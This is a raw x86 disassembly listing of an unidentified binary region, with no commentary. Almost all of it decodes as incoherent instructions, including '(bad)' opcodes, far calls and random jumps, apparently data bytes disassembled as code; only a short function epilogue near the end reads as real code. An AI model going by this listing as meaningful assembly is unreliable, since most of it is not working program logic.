  418756:	mov    ch,0xfc
  418758:	cwde   
  418759:	test   DWORD PTR [ebx+0x27],esp
  41875c:	dec    eax
  41875d:	inc    edi
  41875e:	jle    0x418731
  418760:	jne    0x4187a0
  418762:	out    dx,eax
  418763:	xchg   ebx,eax
  418764:	cmp    DWORD PTR [edx],ecx
  418766:	push   0x5c
  418768:	out    0xb1,al
  41876a:	pop    ss
  41876b:	mov    ebx,esi
  41876d:	cli    
  41876e:	or     ah,BYTE PTR [ecx+0x7753161c]
  418774:	sbb    DWORD PTR [edx],ebx
  418776:	fcmovu st,st(4)
  418778:	in     eax,dx
  418779:	xchg   esi,eax
  41877a:	(bad)  
  41877b:	in     eax,dx
  41877c:	fs pop esp
  41877e:	jae    0x4187ba
  418780:	std    
  418781:	aas    
  418782:	dec    eax
  418783:	ja     0x4187b0
  418785:	neg    BYTE PTR [ecx]
  418787:	and    BYTE PTR [edi+0x5a],0x3b
  41878b:	outs   dx,DWORD PTR ds:[esi]
  41878c:	mov    dh,0xa1
  41878e:	mov    ebp,0x18694ed
  418793:	jmp    FWORD PTR [eax-0x69]
  418796:	xor    DWORD PTR [ecx+0x748b4b23],esp
  41879c:	or     BYTE PTR [edx+0x13bb8933],dl
  4187a2:	fisttp DWORD PTR ds:[esp+eax*8-0x57]
  4187a7:	call   0xee45:0x8b47f6be
  4187ae:	cdq    
  4187af:	add    dl,BYTE PTR [ebx+esi*4+0x1a]
  4187b3:	mov    ah,0xef
  4187b5:	arpl   WORD PTR [ecx+0x3c],bx
  4187b8:	push   ebp
  4187b9:	(bad)  
  4187ba:	push   ebp
  4187bb:	fwait
  4187bc:	or     BYTE PTR [ebx+0x292ce316],dl
  4187c2:	dec    ebx
  4187c3:	pop    es
  4187c4:	xor    ebx,esp
  4187c6:	outs   dx,DWORD PTR ds:[esi]
  4187c7:	push   cs
  4187c8:	aam    0x51
  4187ca:	pop    ds
  4187cb:	shl    al,1
  4187cd:	push   cs
  4187ce:	mov    BYTE PTR [edi],ch
  4187d0:	and    esp,DWORD PTR [ebp+0x31]
  4187d3:	in     eax,0xb1
  4187d5:	mov    ah,0x51
  4187d7:	inc    edx
  4187d8:	cld    
  4187d9:	mov    ah,0x6c
  4187db:	stc    
  4187dc:	ins    DWORD PTR es:[edi],dx
  4187dd:	xor    BYTE PTR [ebx+0x31],0x75
  4187e1:	das    
  4187e2:	cdq    
  4187e3:	cmp    DWORD PTR [esi+0x4f2ba45f],0x7c
  4187ea:	sub    BYTE PTR [edi],ah
  4187ec:	ss mov ch,0x0
  4187ef:	sub    DWORD PTR [edx-0x7d4a3e14],0xba9b2109
  4187f9:	lock rcr DWORD PTR [ebx],0xb6
  4187fd:	mov    al,0xd4
  4187ff:	in     eax,dx
  418800:	mov    ds:0xf90748f,eax
  418805:	push   edi
  418806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418808:	out    0xd3,al
  41880a:	out    0x31,eax
  41880c:	xchg   esi,eax
  41880d:	mov    ecx,edx
  41880f:	pop    eax
  418810:	jno    0x418880
  418812:	add    esi,0xfffffff0
  418815:	jne    0x4187f5
  418817:	fisttp QWORD PTR [edx+0x76]
  41881a:	out    dx,al
  41881b:	mov    al,0x89
  41881d:	loope  0x41885a
  41881f:	mov    WORD PTR [ecx],?
  418821:	std    
  418822:	jge    0x418871
  418824:	sbb    ah,BYTE PTR [ebp+0x77]
  418827:	vmulps ymm4,ymm3,ymm1
  41882b:	(bad)  
  41882c:	stos   BYTE PTR es:[edi],al
  41882d:	leave  
  41882e:	cmp    eax,0x8423f8d0
  418833:	aam    0x52
  418835:	ins    DWORD PTR es:[edi],dx
  418836:	(bad)  
  418837:	es pop ss
  418839:	or     ebx,edx
  41883b:	jb     0x4187f9
  41883d:	cmp    al,0x63
  41883f:	data16 inc BYTE PTR [ebx-0x5bc0dd14]
  418846:	cmp    al,0x77
  418848:	xlat   BYTE PTR ds:[ebx]
  418849:	out    dx,eax
  41884a:	mov    al,ds:0xba85e60c
  41884f:	retf   
  418850:	loopne 0x418890
  418852:	mov    ebp,edx
  418854:	sti    
  418855:	and    ecx,DWORD PTR [ebx-0x5eed3a88]
  41885b:	inc    esp
  41885c:	outs   dx,DWORD PTR ds:[esi]
  41885d:	jae    0x4188af
  41885f:	inc    ecx
  418860:	and    DWORD PTR [esi+edi*4],0x2c
  418864:	dec    eax
  418865:	(bad)
  418868:	outs   dx,BYTE PTR ds:[esi]
  418869:	push   ecx
  41886a:	pop    esi
  41886b:	call   0x783b:0x4aaf4b67
  418872:	fwait
  418873:	jg     0x41887e
  418875:	loop   0x4188a2
  418877:	jo     0x4188da
  418879:	inc    ebx
  41887a:	cmc    
  41887b:	call   0x8457:0xe16c5e4d
  418882:	mov    ds:0x707bca9b,al
  418887:	sti    
  418888:	push   es
  418889:	push   esi
  41888a:	xlat   BYTE PTR ds:[ebx]
  41888b:	adc    ebx,ecx
  41888d:	ss fcmovnu st,st(5)
  418890:	scas   eax,DWORD PTR es:[edi]
  418891:	jle    0x41889a
  418893:	jge    0x418876
  418895:	shl    DWORD PTR [ecx+edi*4-0x5739f529],1
  41889c:	pop    ds
  41889d:	push   ds
  41889e:	push   ds
  41889f:	stos   BYTE PTR es:[edi],al
  4188a0:	jmp    0xbf371b56
  4188a5:	sub    al,0x2b
  4188a7:	pop    edi
  4188a8:	mov    WORD PTR [ecx],fs
  4188aa:	nop
  4188ab:	mov    ds:0xaa951cad,eax
  4188b0:	pop    esi
  4188b1:	bound  eax,QWORD PTR [edi+0x685961a6]
  4188b7:	dec    ecx
  4188b8:	(bad)  
  4188b9:	mov    edi,ebx
  4188bb:	leave  
  4188bc:	mov    esi,0xf6f72b06
  4188c1:	retf   
  4188c2:	mov    cl,0x71
  4188c4:	mov    BYTE PTR [di],ch
  4188c7:	add    BYTE PTR [edx],cl
  4188c9:	xchg   edx,eax
  4188ca:	jnp    0x4188df
  4188cc:	mov    eax,ds:0x43302945
  4188d1:	xlat   BYTE PTR ds:[ebx]
  4188d2:	js     0x418862
  4188d4:	aas    
  4188d5:	repz jno 0x418937
  4188d8:	sub    BYTE PTR [eax+ecx*8],ah
  4188db:	repz int3 
  4188dd:	push   ecx
  4188de:	jo     0x418907
  4188e0:	and    eax,0xa2879f64
  4188e5:	test   al,bl
  4188e7:	cld    
  4188e8:	xor    esi,edx
  4188ea:	push   0x723248bf
  4188ef:	in     eax,dx
  4188f0:	popa   
  4188f1:	push   0xfe129a29
  4188f6:	idiv   DWORD PTR [ecx+0x71ddfe0d]
  4188fc:	mov    edi,0xef883a28
  418901:	js     0x418898
  418903:	dec    eax
  418904:	js     0x418917
  418906:	and    DWORD PTR [ebx],0x66e22e5d
  41890c:	mov    DWORD PTR fs:[eax],ecx
  41890f:	pop    esp
  418910:	nop
  418911:	jg     0x418933
  418913:	or     ecx,DWORD PTR [ecx+0x34]
  418916:	cmp    dh,0xa5
  418919:	call   0xabd160dc
  41891e:	xchg   ecx,eax
  41891f:	shr    BYTE PTR [ecx],1
  418921:	dec    esi
  418922:	push   es
  418923:	adc    ebp,DWORD PTR [esi+0x58e54d66]
  418929:	sub    ebx,0x31
  41892c:	mov    eax,ds:0xddf8d503
  418931:	cmp    al,0x8e
  418933:	pop    eax
  418934:	je     0x4189b2
  418936:	mov    WORD PTR [edx-0xc96b63d],cs
  41893c:	out    dx,eax
  41893d:	jg     0x41897c
  41893f:	pop    ds
  418940:	test   BYTE PTR [ebp+0x4f],bh
  418943:	mov    ds,WORD PTR [ecx+eiz*2-0x23a38e2a]
  41894a:	pop    es
  41894b:	and    DWORD PTR [ebx-0x20],ebp
  41894e:	adc    ebx,DWORD PTR [ebx+0x1620a9cb]
  418954:	pushf  
  418955:	and    eax,DWORD PTR [edx]
  418957:	pushf  
  418958:	nop
  418959:	xchg   ebp,eax
  41895a:	and    ecx,DWORD PTR [edi+0x5454ebb6]
  418960:	and    BYTE PTR [eax],al
  418962:	xor    DWORD PTR [ecx-0x7458e78f],ebx
  418968:	adc    BYTE PTR [ecx],0x78
  41896b:	into   
  41896c:	scas   al,BYTE PTR es:[edi]
  41896d:	enter  0x2877,0xae
  418971:	pop    esi
  418972:	arpl   WORD PTR [ecx+0x30d866da],dx
  418978:	pop    ecx
  418979:	jo     0x4189f3
  41897b:	(bad)  
  41897c:	or     edi,edi
  41897e:	cmp    DWORD PTR [eax-0x52],eax
  418981:	loope  0x4189ed
  418983:	into   
  418984:	not    esp
  418986:	xchg   ebp,eax
  418987:	rcl    DWORD PTR [edi],1
  418989:	jb     0x418923
  41898b:	sub    eax,DWORD PTR [edi-0x1d]
  41898e:	push   ds
  41898f:	lods   al,BYTE PTR ds:[esi]
  418990:	fistp  QWORD PTR [eax+0x78]
  418993:	stos   DWORD PTR es:[edi],eax
  418994:	cdq    
  418995:	adc    al,0xba
  418997:	mov    ebp,0x5e458601
  41899c:	mov    dh,0xcd
  41899e:	lahf   
  41899f:	or     DWORD PTR [ebp+0x77895fa7],edi
  4189a5:	xchg   esp,eax
  4189a6:	cwde   
  4189a7:	popa   
  4189a8:	out    dx,eax
  4189a9:	cli    
  4189aa:	bsf    ebp,DWORD PTR [ebx+ebx*4+0x3f]
  4189af:	sub    bl,al
  4189b1:	cmp    al,0xca
  4189b3:	xor    BYTE PTR [edx+0x53],0x3f
  4189b7:	stos   DWORD PTR es:[edi],eax
  4189b8:	je     0x4189af
  4189ba:	pop    edx
  4189bb:	xor    DWORD PTR [eax],ebx
  4189bd:	cld    
  4189be:	pop    eax
  4189bf:	leave  
  4189c0:	xchg   esp,eax
  4189c1:	sub    dh,bh
  4189c3:	pop    es
  4189c4:	cld    
  4189c5:	es sti 
  4189c7:	dec    ecx
  4189c8:	dec    esp
  4189c9:	cwde   
  4189ca:	fsub   QWORD PTR [esi+0x2e345c1c]
  4189d0:	rcl    DWORD PTR [edi+edi*8-0x1feacf19],cl
  4189d7:	leave  
  4189d8:	nop
  4189d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189da:	or     DWORD PTR [edx],ebx
  4189dc:	mov    eax,?
  4189de:	mov    ecx,0xe080ec0b
  4189e3:	dec    ecx
  4189e4:	(bad)  
  4189e5:	jmp    0xbf2a78c
  4189ea:	lods   al,BYTE PTR ds:[esi]
  4189eb:	jp     0x4189d2
  4189ed:	gs mov dl,0xa0
  4189f0:	lods   al,BYTE PTR ds:[esi]
  4189f1:	das    
  4189f2:	or     eax,0x9c2d0c9c
  4189f7:	xchg   BYTE PTR ds:0xc628d60b,ch
  4189fd:	fsub   DWORD PTR [edx-0x8]
  418a00:	adc    BYTE PTR [edi-0x48497f2a],dh
  418a06:	cmc    
  418a07:	int    0xeb
  418a09:	jecxz  0x418a84
  418a0b:	fwait
  418a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a0d:	sub    al,0x14
  418a0f:	popf   
  418a10:	jmp    0xb0683bfc
  418a15:	gs pop eax
  418a17:	aas    
  418a18:	and    esi,DWORD PTR [edx+0x3a]
  418a1b:	push   ecx
  418a1c:	mov    ds:0x688e5c11,eax
  418a21:	out    0x58,al
  418a23:	cmp    cl,BYTE PTR [ecx-0x80]
  418a26:	jecxz  0x418a07
  418a28:	mov    ecx,0xc5deb0f3
  418a2d:	ret    0xba02
  418a30:	jp     0x4189e1
  418a32:	jmp    0xbd4518c8
  418a37:	fwait
  418a38:	push   ecx
  418a39:	cmp    eax,0x999f5551
  418a3e:	outs   dx,DWORD PTR ds:[esi]
  418a3f:	push   esp
  418a40:	mov    BYTE PTR [ecx+0x73f90785],bl
  418a46:	sbb    BYTE PTR [esi-0x5c],bl
  418a49:	inc    esp
  418a4a:	inc    esp
  418a4b:	sbb    edx,DWORD PTR [ebx]
  418a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a4e:	sar    BYTE PTR [esi+0x66],1
  418a51:	mov    ds:0x69bd9d85,al
  418a56:	add    edi,edi
  418a58:	adc    dl,BYTE PTR [esi-0x7c]
  418a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5c:	or     ah,dh
  418a5e:	cmc    
  418a5f:	out    0x13,al
  418a61:	stos   BYTE PTR es:[edi],al
  418a62:	lock push esi
  418a64:	test   eax,0xa01e9fdd
  418a69:	lock xchg DWORD PTR [ebp+0x9f79fe9],ecx
  418a70:	jmp    0x418a93
  418a72:	jno    0x418adc
  418a74:	inc    eax
  418a75:	inc    ebp
  418a76:	sub    al,0xd8
  418a78:	jne    0x418a84
  418a7a:	lea    eax,[esi-0x79]
  418a7d:	sub    eax,0xb97f42d5
  418a82:	cwde   
  418a83:	icebp  
  418a84:	mov    al,ds:0x9cf53223
  418a89:	mov    edi,esi
  418a8b:	mov    al,0x4a
  418a8d:	addr16 sub eax,0x50ec57a9
  418a93:	call   0xd4e2:0x97d14a6d
  418a9a:	inc    eax
  418a9b:	jl     0x418a82
  418a9d:	mov    esp,0x177fb224
  418aa2:	push   ss
  418aa3:	inc    edx
  418aa4:	mov    ch,0x80
  418aa6:	scas   al,BYTE PTR es:[edi]
  418aa7:	add    esi,edi
  418aa9:	fcmovne st,st(7)
  418aab:	push   ebp
  418aac:	mov    eax,ds:0x733c8f75
  418ab1:	(bad)  gs:[ebp+0x38]
  418ab5:	sbb    dl,BYTE PTR ds:0xd1525090
  418abb:	mov    edi,0x166d0bd9
  418ac0:	mov    ebx,0xd20ef8fc
  418ac5:	dec    esi
  418ac6:	dec    eax
  418ac7:	sar    BYTE PTR [ebx+0x28],cl
  418aca:	loope  0x418ab5
  418acc:	xor    BYTE PTR [ecx],cl
  418ace:	pop    esp
  418acf:	pop    edx
  418ad0:	mov    edi,0x86240895
  418ad5:	push   ds
  418ad6:	push   0xab3eb366
  418adb:	pop    ebx
  418adc:	loope  0x418ad9
  418ade:	pop    esp
  418adf:	es inc edx
  418ae1:	shl    BYTE PTR [eax+0x7b2db967],cl
  418ae7:	cmc    
  418ae8:	push   esp
  418ae9:	lahf   
  418aea:	inc    edi
  418aeb:	idiv   BYTE PTR ss:[ecx-0x3621e2aa]
  418af2:	push   ebp
  418af3:	push   0xffffffd9
  418af5:	test   DWORD PTR [esi-0x41ae2730],ebx
  418afb:	xchg   ebp,eax
  418afc:	or     ebp,DWORD PTR ds:0xc8d809f4
  418b02:	stc    
  418b03:	pop    edx
  418b04:	pop    edx
  418b05:	test   eax,0xe889d0d8
  418b0a:	mov    esi,0xd6b5e836
  418b0f:	pop    es
  418b10:	(bad)  
  418b12:	daa    
  418b13:	sub    bl,BYTE PTR [esi+0x16ec9a86]
  418b19:	ret    
  418b1a:	loope  0x418b6e
  418b1c:	mov    BYTE PTR [ecx-0x6c88ec50],0x8
  418b23:	xchg   ebp,eax
  418b24:	pop    edi
  418b25:	ret    
  418b26:	sbb    eax,0xd4b4d20d
  418b2b:	push   0x47
  418b2d:	dec    esi
  418b2e:	cmc    
  418b2f:	stos   DWORD PTR es:[edi],eax
  418b30:	fs xchg esi,eax
  418b32:	pusha  
  418b33:	jp     0x418b18
  418b35:	jg     0x418ba3
  418b37:	sub    eax,0xee3bfa19
  418b3c:	mov    dh,0xab
  418b3e:	mov    dh,0x35
  418b40:	sub    DWORD PTR [ebx+0xcb28e76],ecx
  418b46:	mov    ds:0x8cbaac33,eax
  418b4b:	fmul   DWORD PTR [eax+0x3]
  418b4e:	add    eax,0x33719e21
  418b53:	ins    BYTE PTR es:[edi],dx
  418b54:	push   ds
  418b55:	ds jp  0x418b0a
  418b58:	mov    DWORD PTR [ebp-0x2c],ebp
  418b5b:	or     al,0xf5
  418b5d:	and    esp,DWORD PTR [ecx]
  418b5f:	sbb    al,0xda
  418b61:	mov    ch,0x34
  418b63:	cwde   
  418b64:	cs push ss
  418b66:	xchg   esp,eax
  418b67:	inc    ebx
  418b68:	add    eax,0x528f03d7
  418b6d:	mov    BYTE PTR [ecx+edx*4+0x456d654a],al
  418b74:	mov    esi,0x5e255223
  418b79:	ret    
  418b7a:	test   dl,dl
  418b7c:	stc    
  418b7d:	ds loopne 0x418bfd
  418b80:	imul   ecx,DWORD PTR [ecx+0x6cbac2f8],0x7815b922
  418b8a:	arpl   WORD PTR [edi],bx
  418b8c:	push   0x22
  418b8e:	hlt    
  418b8f:	and    ch,BYTE PTR [ebx+0x60]
  418b92:	mov    esp,0xd07b4942
  418b97:	rcr    ebx,cl
  418b99:	cmp    esi,DWORD PTR [edi+0x1d]
  418b9c:	mov    ch,0xef
  418b9e:	sbb    DWORD PTR [ecx],edi
  418ba0:	iret   
  418ba1:	das    
  418ba2:	add    eax,0x914adb1b
  418ba7:	and    eax,0xd47c48e9
  418bac:	cmp    ebp,DWORD PTR [edx-0x29217eb]
  418bb2:	xor    al,0x4e
  418bb4:	mov    es,WORD PTR ds:0x4f0c69e8
  418bba:	sbb    ch,BYTE PTR ds:0x35ae4500
  418bc0:	repnz sub al,0xed
  418bc3:	fld    DWORD PTR [ecx]
  418bc5:	cmp    BYTE PTR [ecx],dl
  418bc7:	inc    esi
  418bc8:	cmp    DWORD PTR [ebp-0x2ebd5332],esp
  418bce:	loop   0x418c0c
  418bd0:	into   
  418bd1:	mov    ds:0x380eae34,al
  418bd6:	scas   al,BYTE PTR es:[edi]
  418bd7:	pop    esp
  418bd8:	pop    ss
  418bd9:	xor    al,0xfe
  418bdb:	xchg   edx,eax
  418bdc:	xor    DWORD PTR [esi+0x2b],esp
  418bdf:	and    eax,0x90104da9
  418be4:	fistp  QWORD PTR [ebx+0x239a8ca7]
  418bea:	adc    BYTE PTR [esi],dl
  418bec:	lea    edi,[esi]
  418bee:	and    al,0x35
  418bf0:	inc    eax
  418bf1:	ror    DWORD PTR [esi+0x1a],cl
  418bf4:	inc    BYTE PTR [eax-0x3b4fc116]
  418bfa:	popf   
  418bfb:	cbw    
  418bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bfe:	xchg   edi,eax
  418bff:	inc    edx
  418c00:	mov    bl,0x26
  418c02:	idiv   DWORD PTR [eax]
  418c04:	adc    cl,BYTE PTR [esp+ebp*1+0x5d]
  418c08:	mov    ds:0xa496284b,eax
  418c0d:	xor    DWORD PTR [edx],0x17b6ba8f
  418c13:	sbb    eax,0x2fff6e18
  418c18:	inc    ecx
  418c19:	add    eax,0x955c3a5d
  418c1e:	jbe    0x418be3
  418c20:	push   ss
  418c21:	fidivr DWORD PTR [eax-0x365c2882]
  418c27:	inc    ecx
  418c28:	call   0xafa2:0xce325b24
  418c2f:	pop    esp
  418c30:	push   esp
  418c31:	fbld   TBYTE PTR [ecx-0x51325cca]
  418c37:	(bad)  
  418c38:	pusha  
  418c39:	repnz and DWORD PTR [ebp+edx*4-0x2],esp
  418c3e:	jmp    0xf9539465
  418c43:	data16 mov dl,0xa9
  418c46:	xor    eax,0x5bc29797
  418c4b:	add    DWORD PTR [ecx],esi
  418c4d:	call   0xfec:0x705228cc
  418c54:	out    dx,eax
  418c55:	adc    ecx,DWORD PTR [edx-0x3132766e]
  418c5b:	mov    edx,0x37f3990c
  418c60:	and    ecx,DWORD PTR [ecx-0x44]
  418c63:	sub    BYTE PTR [edi],ch
  418c65:	ja     0x418c66
  418c67:	cmp    eax,0x7d12d8e4
  418c6c:	mov    edi,0x9dfcc231
  418c71:	pop    ebp
  418c72:	aaa    
  418c73:	retf   0xf42f
  418c76:	push   es
  418c77:	stos   DWORD PTR es:[edi],eax
  418c78:	sbb    cl,ch
  418c7a:	das    
  418c7b:	dec    ecx
  418c7c:	aad    0xaa
  418c7e:	pop    ebp
  418c7f:	(bad)  
  418c81:	adc    eax,0xe1b85479
  418c86:	and    al,0xc
  418c88:	add    DWORD PTR [edi+edi*4],edx
  418c8b:	stos   BYTE PTR es:[edi],al
  418c8c:	pop    ebp
  418c8d:	cli    
  418c8e:	test   esi,0xaceac9c0
  418c94:	ins    DWORD PTR es:[edi],dx
  418c95:	adc    al,0x0
  418c97:	fs adc dl,al
  418c9a:	mov    cl,0xc
  418c9c:	mov    esp,DWORD PTR [edi+0x161df06c]
  418ca2:	dec    ecx
  418ca3:	not    al
  418ca5:	pop    ss
  418ca6:	mov    edi,0xd48d0cfa
  418cab:	and    BYTE PTR [ebx+esi*1-0x799e8d79],ch
  418cb2:	pushw  es
  418cb4:	sahf   
  418cb5:	in     al,dx
  418cb6:	dec    edx
  418cb7:	enter  0x20f,0xc5
  418cbb:	or     BYTE PTR [eax+ecx*8-0x2eb23feb],bh
  418cc2:	and    eax,0xbebe622f
  418cc7:	inc    BYTE PTR [ebp-0x69]
  418cca:	scas   al,BYTE PTR es:[edi]
  418ccb:	mov    al,BYTE PTR [edx+esi*2-0x5d09350]
  418cd2:	ret    0x21cf
  418cd5:	aam    0x14
  418cd7:	push   ss
  418cd8:	(bad)  
  418cd9:	out    0x59,al
  418cdb:	inc    DWORD PTR [ebx+0x7a708a6e]
  418ce1:	jmp    0x7859:0x78c3a28a
  418ce8:	rol    DWORD PTR [edi],0xb4
  418ceb:	lahf   
  418cec:	lods   eax,DWORD PTR ds:[esi]
  418ced:	ja     0x418d0d
  418cef:	rol    esp,0x13
  418cf2:	mov    al,0x50
  418cf4:	int    0xab
  418cf6:	(bad)  
  418cf7:	mov    bl,0xb3
  418cf9:	dec    ebx
  418cfa:	fs jnp 0x418d77
  418cfd:	add    eax,0x6b30bf1c
  418d02:	inc    ecx
  418d03:	inc    ebx
  418d04:	fisttp DWORD PTR [esi-0x3a70fa06]
  418d0a:	mov    dh,0x83
  418d0c:	das    
  418d0d:	push   esi
  418d0e:	mov    ecx,DWORD PTR [edi]
  418d10:	rcl    DWORD PTR [ecx+eiz*2+0x3f7cc6ee],0x8d
  418d18:	or     edx,DWORD PTR [edx]
  418d1a:	stos   DWORD PTR es:[edi],eax
  418d1b:	(bad)  
  418d1c:	pop    ds
  418d1d:	mov    bh,0xe0
  418d1f:	lods   eax,DWORD PTR ds:[esi]
  418d20:	repnz and al,0x27
  418d23:	inc    edx
  418d24:	push   ecx
  418d26:	retf   0xaafc
  418d29:	mov    ebx,0x48031d3d
  418d2e:	aam    0x51
  418d30:	and    DWORD PTR [edi],edx
  418d32:	test   BYTE PTR [edx+edi*1-0x12],0xfe
  418d37:	fwait
  418d38:	in     al,0xf9
  418d3a:	mov    al,0xa0
  418d3c:	mov    edx,0xe586efa3
  418d41:	addr16 in eax,0xb8
  418d44:	mov    ss,WORD PTR [eax-0x348e2f8]
  418d4a:	lods   al,BYTE PTR ds:[esi]
  418d4b:	cmp    al,0xd6
  418d4d:	dec    ecx
  418d4e:	cmp    al,0x53
  418d50:	lea    eax,[ebp-0x3cf4f890]
  418d56:	(bad)  
  418d58:	add    al,0x80
  418d5a:	ins    BYTE PTR es:[edi],dx
  418d5b:	or     ch,dl
  418d5d:	sbb    al,0xc7
  418d5f:	pop    eax
  418d60:	add    al,0x39
  418d62:	cmp    ebx,0xffffffb8
  418d65:	push   cs
  418d66:	mov    cs,WORD PTR [ebp-0x70]
  418d69:	jge    0x418da1
  418d6b:	push   0x6b
  418d6d:	xor    DWORD PTR ds:0x7e03f44b,ecx
  418d73:	add    DWORD PTR [ecx],eax
  418d75:	adc    al,0x6
  418d77:	pop    ecx
  418d78:	and    al,0xe7
  418d7a:	out    dx,eax
  418d7b:	rcl    DWORD PTR [ebp+eax*8-0x5d0c63ac],1
  418d82:	inc    ebp
  418d83:	xchg   DWORD PTR [edx-0x45828e9],edi
  418d89:	push   0xffffffe9
  418d8b:	adc    dl,BYTE PTR [esi]
  418d8d:	cmp    BYTE PTR cs:[ecx],0x47
  418d91:	mov    cl,bh
  418d93:	xchg   ecx,eax
  418d94:	push   esi
  418d95:	not    DWORD PTR [esp+ebp*4]
  418d98:	rol    DWORD PTR [ecx],cl
  418d9a:	(bad)  
  418d9b:	retf   0x1df5
  418d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9f:	inc    esp
  418da0:	dec    eax
  418da1:	mov    ebx,DWORD PTR [ecx-0x6613c106]
  418da7:	cmc    
  418da8:	cdq    
  418da9:	dec    edi
  418daa:	mov    dh,0xd5
  418dac:	pop    eax
  418dad:	xor    ebx,DWORD PTR [ebp+eiz*8-0x67]
  418db1:	stos   DWORD PTR es:[edi],eax
  418db2:	jne    0x418d4a
  418db4:	sub    al,0x3a
  418db6:	jecxz  0x418e16
  418db8:	retf   
  418db9:	cmp    al,0xa7
  418dbb:	dec    esi
  418dbc:	cdq    
  418dbd:	dec    ecx
  418dbe:	pop    esi
  418dbf:	push   esi
  418dc0:	adc    eax,0x4df7b04d
  418dc5:	inc    eax
  418dc6:	outs   dx,DWORD PTR ds:[esi]
  418dc7:	sbb    al,BYTE PTR [ebx-0x30]
  418dca:	test   eax,0x31dfcbb4
  418dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dd0:	cwde   
  418dd1:	stos   BYTE PTR es:[edi],al
  418dd2:	adc    al,0x64
  418dd4:	fcmovu st,st(4)
  418dd6:	repnz sub BYTE PTR [eax-0x52],0x4a
  418ddb:	mov    ds:0xed68d51c,al
  418de0:	push   ss
  418de1:	jmp    0x4bdbdaf8
  418de6:	pop    ecx
  418de7:	into   
  418de8:	into   
  418de9:	ret    
  418dea:	inc    eax
  418deb:	cmc    
  418dec:	xor    DWORD PTR [eax*8+0x56910bb6],ebx
  418df3:	cmp    ch,BYTE PTR [ebx+0x6fcbe773]
  418df9:	mov    BYTE PTR [ebx+0x4a2e9297],0xd6
  418e00:	mov    BYTE PTR [edx],ah
  418e02:	call   DWORD PTR [edx]
  418e04:	adc    eax,0xe058e62
  418e09:	mov    DWORD PTR [ecx],esp
  418e0b:	(bad)  
  418e0c:	stos   BYTE PTR es:[edi],al
  418e0d:	pop    ebx
  418e0e:	out    dx,eax
  418e0f:	cmp    DWORD PTR [ecx],ebx
  418e11:	ret    
  418e12:	inc    edx
  418e13:	pop    es
  418e14:	adc    dh,al
  418e16:	test   BYTE PTR [eax],bl
  418e18:	inc    edi
  418e19:	mov    dh,0xe2
  418e1b:	lea    ebp,[ebp-0x7c]
  418e1e:	push   edx
  418e1f:	mov    ds:0x94d3ecd9,al
  418e24:	stc    
  418e25:	pushf  
  418e26:	add    dh,BYTE PTR [eax]
  418e28:	mov    ecx,0xf5b4ce61
  418e2d:	jne    0x418df3
  418e2f:	mov    BYTE PTR [esi],ah
  418e31:	out    dx,al
  418e32:	dec    ebx
  418e33:	pusha  
  418e34:	mov    ebx,0x63ad448b
  418e39:	(bad)  
  418e3a:	push   esp
  418e3b:	jp     0x418e8c
  418e3d:	lods   eax,DWORD PTR ds:[esi]
  418e3e:	repz pop ecx
  418e40:	in     eax,0xb4
  418e42:	sub    bh,bh
  418e44:	mov    ch,0xc5
  418e46:	sbb    DWORD PTR [esi-0x7af0e9de],eax
  418e4c:	add    DWORD PTR [eax+0x4d8bffff],edi
  418e52:	clc    
  418e53:	xor    ecx,eax
  418e55:	mov    eax,DWORD PTR [ebp+0x10]
  418e58:	add    ecx,esi
  418e5a:	mov    DWORD PTR [eax],ecx
  418e5c:	pop    edi
  418e5d:	pop    esi
  418e5e:	pop    ebx
  418e5f:	leave  
  418e60:	ret    0xc
  418e63:	add    BYTE PTR [eax-0x5ffbffbe],ah
  418e69:	inc    edx
  418e6a:	add    BYTE PTR [eax],cl
  418e6c:	mov    al,ds:0xa00c0042
  418e71:	inc    edx
  418e72:	add    BYTE PTR [eax],dl
  418e74:	mov    al,ds:0xa0140042
  418e79:	inc    edx
  418e7a:	add    BYTE PTR [eax],bl
  418e7c:	mov    al,ds:0xa01c0042
  418e81:	inc    edx
  418e82:	add    BYTE PTR [eax],al
  418e84:	rol    BYTE PTR [edx+0x0],1
  418e87:	add    al,0xd0
  418e89:	inc    edx
  418e8a:	add    BYTE PTR [eax],cl
  418e8c:	rol    BYTE PTR [edx+0x0],1
  418e8f:	or     al,0xd0
  418e91:	inc    edx
  418e92:	add    BYTE PTR [eax],dl
  418e94:	rol    BYTE PTR [edx+0x0],1
  418e97:	adc    al,0xd0
  418e99:	inc    edx
  418e9a:	add    BYTE PTR [eax],bl
  418e9c:	rol    BYTE PTR [edx+0x0],1
  418e9f:	sbb    al,0xd0
  418ea1:	inc    edx
	...
  418eb2:	add    BYTE PTR [eax],al
  418eb4:	sub    al,0x84
  418eb6:	pop    esi
  418eb7:	dec    ebp
  418eb8:	add    BYTE PTR [eax],al
  418eba:	add    BYTE PTR [eax],al
  418ebc:	add    al,BYTE PTR [eax]
  418ebe:	add    BYTE PTR [eax],al
  418ec0:	cmp    eax,0xb0000000
  418ec5:	pop    DWORD PTR [ecx]
  418ec7:	add    BYTE PTR [eax+0x183],dh
  418ecd:	add    BYTE PTR [eax],al
  418ecf:	add    BYTE PTR [eax],al
  418ed1:	add    BYTE PTR [eax],al
  418ed3:	add    BYTE PTR [esp+eax*4],ch
  418ed6:	pop    esi
  418ed7:	dec    ebp
  418ed8:	add    BYTE PTR [eax],al
  418eda:	add    BYTE PTR [eax],al
  418edc:	add    cl,BYTE PTR [edi+0x10001]
  418ee2:	add    BYTE PTR [eax],al
  418ee4:	add    DWORD PTR [eax],eax
  418ee6:	add    BYTE PTR [eax],al
  418ee8:	add    DWORD PTR [eax],eax
  418eea:	add    BYTE PTR [eax],al
  418eec:	clc    
  418eed:	mov    es,WORD PTR [ecx]
  418eef:	add    ah,bh
  418ef1:	mov    es,WORD PTR [ecx]
  418ef3:	add    BYTE PTR [eax],al
  418ef5:	pop    DWORD PTR [ecx]
  418ef7:	add    bl,al
  418ef9:	sub    eax,DWORD PTR [eax]
  418efb:	add    BYTE PTR [esi],cl
  418efd:	pop    DWORD PTR [ecx]
